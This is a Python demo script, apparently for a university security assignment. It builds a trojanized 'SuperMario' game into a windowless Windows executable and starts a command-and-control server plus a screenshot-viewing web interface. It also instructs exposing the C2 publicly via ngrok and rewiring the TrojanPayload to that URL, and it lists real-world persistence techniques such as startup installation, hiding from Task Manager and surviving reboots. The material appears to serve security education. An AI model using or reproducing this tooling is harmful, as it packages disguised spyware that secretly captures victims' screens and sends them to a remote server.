"""
Complete demonstration script for the assignment
Shows how to use all components together
"""
import subprocess
import time
import os
import sys
import threading


def print_step(step, description):
    print(f"\n{'=' * 60}")
    print(f"STEP {step}: {description}")
    print(f"{'=' * 60}")


def run_command(cmd, description):
    print(f"\n▶ {description}")
    print(f"   Command: {cmd}")

    try:
        if isinstance(cmd, str):
            process = subprocess.Popen(cmd, shell=True)
            return process
        else:
            process = subprocess.Popen(cmd)
            return process
    except Exception as e:
        print(f"   ❌ Error: {e}")
        return None


def build_executable():
    """Build the game as .exe using PyInstaller"""
    print_step(1, "BUILDING EXECUTABLE (.EXE)")

    # Create build script
    build_script = """
import PyInstaller.__main__
import os

# Ensure infected_game.py exists
if not os.path.exists('infected_game.py'):
    print("ERROR: infected_game.py not found!")
    exit(1)

# PyInstaller arguments
args = [
    'infected_game.py',
    '--onefile',           # Single executable
    '--windowed',          # No console window
    '--name=SuperMario',   # Output name
    '--clean',             # Clean build
    '--noconfirm',         # Don't ask for confirmation
]

print(f"Building executable with: {args}")
PyInstaller.__main__.run(args)
"""

    # Write and run build script
    with open('build_game.py', 'w') as f:
        f.write(build_script)

    # Check if PyInstaller is installed
    try:
        import PyInstaller
        print("✓ PyInstaller is installed")
    except ImportError:
        print("Installing PyInstaller...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])

    # Run the build
    build_process = run_command(
        f"{sys.executable} build_game.py",
        "Building SuperMario.exe"
    )

    if build_process:
        build_process.wait()

    # Check if executable was created
    exe_path = "./dist/SuperMario.exe"
    if os.path.exists(exe_path):
        print(f"✓ Executable created: {exe_path}")
        print(f"  Size: {os.path.getsize(exe_path) // 1024} KB")
        return exe_path
    else:
        print("❌ Executable not found. Checking for other locations...")
        # Check PyInstaller default locations
        for path in ["./dist/SuperMario.exe", "./SuperMario.exe", "./build/SuperMario.exe"]:
            if os.path.exists(path):
                print(f"✓ Found at: {path}")
                return path

        # Try manual PyInstaller command
        print("Trying manual PyInstaller command...")
        cmd = f"pyinstaller --onefile --windowed --name SuperMario infected_game.py"
        run_command(cmd, "Manual build attempt")

        if os.path.exists("./dist/SuperMario.exe"):
            return "./dist/SuperMario.exe"

    return None


def start_servers():
    """Start the C2 server and web interface"""
    print_step(2, "STARTING SERVERS")

    # Start my_server.py in background
    print("\nStarting C2 server (port 9999)...")
    server_thread = threading.Thread(
        target=lambda: subprocess.run([sys.executable, "my_server.py"]),
        daemon=True
    )
    server_thread.start()
    time.sleep(2)

    # Start view_screenshot.py in background
    print("Starting web interface (port 8000)...")
    web_thread = threading.Thread(
        target=lambda: subprocess.run([sys.executable, "view_screenshot.py"]),
        daemon=True
    )
    web_thread.start()
    time.sleep(2)

    print("\n✓ Servers started:")
    print("  - C2 Server: http://localhost:9999")
    print("  - Web Interface: http://localhost:8000")

    return True


def setup_ngrok():
    """Instructions for ngrok setup"""
    print_step(3, "SETTING UP NGROK")

    print("\nTo expose your server publicly:")
    print("1. Download ngrok from https://ngrok.com/download")
    print("2. Sign up for a free account")
    print("3. Get your authtoken from ngrok dashboard")
    print("4. Run: ngrok authtoken YOUR_TOKEN")
    print("5. Run: ngrok http 8000")
    print("\nThis will give you a public URL like: https://abc123.ngrok.io")
    print("\nUPDATE infected_game.py with your ngrok URL:")
    print("  Change: TrojanPayload(server_url='localhost:9999')")
    print("  To:     TrojanPayload(server_url='YOUR_NGROK_URL:9999')")
    print("\nThen rebuild the executable with: python working_demo.py --build")

    return input("\nPress Enter when you have your ngrok URL ready...")


def demonstrate_persistence():
    """Demonstrate that screenshots continue after game closes"""
    print_step(5, "DEMONSTRATING PERSISTENCE")

    print("\n" + "=" * 60)
    print("PERSISTENCE DEMONSTRATION")
    print("=" * 60)
    print("\nThis shows the trojan continues running after game closes.")
    print("In a real attack, the malware would:")
    print("1. Install itself to startup")
    print("2. Hide from task manager")
    print("3. Survive reboots")
    print("4. Reconnect if connection lost")
    print("\nFor this demo, we use a simple background thread.")

    print("\n📹 For your video:")
    print("1. Show the game running")
    print("2. Show screenshots appearing on web interface")
    print("3. Close the game window")
    print("4. Show screenshots STILL appearing (every 30s)")
    print("5. Explain this demonstrates persistence")


def main():
    print("\n" + "=" * 60)
    print("SUPER MARIO TROJAN DEMONSTRATION")
    print("FOR EDUCATIONAL PURPOSES ONLY")
    print("=" * 60)

    # Check dependencies
    print("\nChecking dependencies...")
    try:
        import pygame
        print("✓ PyGame installed")
    except ImportError:
        print("Installing PyGame...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pygame"])

    try:
        from PIL import ImageGrab
        print("✓ PIL/Pillow installed")
    except ImportError:
        print("Installing Pillow...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pillow"])

    # Build executable
    exe_path = build_executable()
    if not exe_path:
        print("❌ Failed to build executable")
        return

    # Start servers
    if not start_servers():
        print("❌ Failed to start servers")
        return

    # Ngrok setup
    setup_ngrok()

    # Demonstration instructions
    print_step(4, "RUNNING THE DEMONSTRATION")

    print(f"\nTo run the demonstration:")
    print(f"1. Start the game: {exe_path}")
    print(f"2. Open web interface: http://localhost:8000")
    print(f"3. Play the game for 1-2 minutes")
    print(f"4. Observe screenshots appearing every 30 seconds")
    print(f"\nFor the video assignment:")
    print(f"- Record building the .exe")
    print(f"- Record starting the servers")
    print(f"- Record ngrok setup (show public URL)")
    print(f"- Record game running and screenshots appearing")
    print(f"- Record persistence (screenshots after game closes)")

    demonstrate_persistence()

    print("\n" + "=" * 60)
    print("ASSIGNMENT SUBMISSION CHECKLIST")
    print("=" * 60)
    print("✓ 1. Code with malicious insertions (infected_game.py)")
    print("✓ 2. Server code (my_server.py, view_screenshot.py)")
    print("✓ 3. .exe file built")
    print("✓ 4. Video showing:")
    print("     - Code insertion points")
    print("     - Building .exe")
    print("     - Game running")
    print("     - Screenshots on web interface via ngrok")
    print("     - Persistence after game closes")
    print("✓ 5. GitHub repository with all code")
    print("✓ 6. PDF explaining code insertion")
    print("\nEMAIL SUBJECT: COSC3796_Assignment2_{Your Full Name}")
    print("=" * 60)


if __name__ == "__main__":
    # Command line options
    if len(sys.argv) > 1:
        if sys.argv[1] == "--build":
            build_executable()
        elif sys.argv[1] == "--run":
            exe_path = "./dist/SuperMario.exe"
            if os.path.exists(exe_path):
                subprocess.Popen([exe_path])
            else:
                print(f"Executable not found at {exe_path}")
        elif sys.argv[1] == "--servers":
            start_servers()
        elif sys.argv[1] == "--help":
            print("Usage: python working_demo.py [option]")
            print("Options:")
            print("  --build    : Build executable only")
            print("  --run      : Run the game executable")
            print("  --servers  : Start servers only")
            print("  --full     : Run complete demonstration")
    else:
        main()